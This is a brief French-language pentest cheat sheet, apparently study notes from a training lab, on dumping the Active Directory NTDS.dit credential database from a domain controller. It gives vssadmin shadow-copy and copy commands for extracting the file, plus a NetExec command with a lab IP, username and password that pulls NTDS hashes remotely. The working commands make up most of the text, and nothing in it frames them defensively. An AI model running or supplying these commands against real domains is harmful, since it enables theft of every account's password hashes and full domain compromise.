Emplacement: `%systemroot$/ntds` sur le DC. Doit être admin local `Administrators group` ou Domain Admin `Domain Admins group` 
## Capturer avec VSS
Utiliser [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) pour copier le disque contenant NTDS.dit
```shell-session
vssadmin CREATE SHADOW /For=C:

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
## Capturer avec NetExec
```shell-session
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
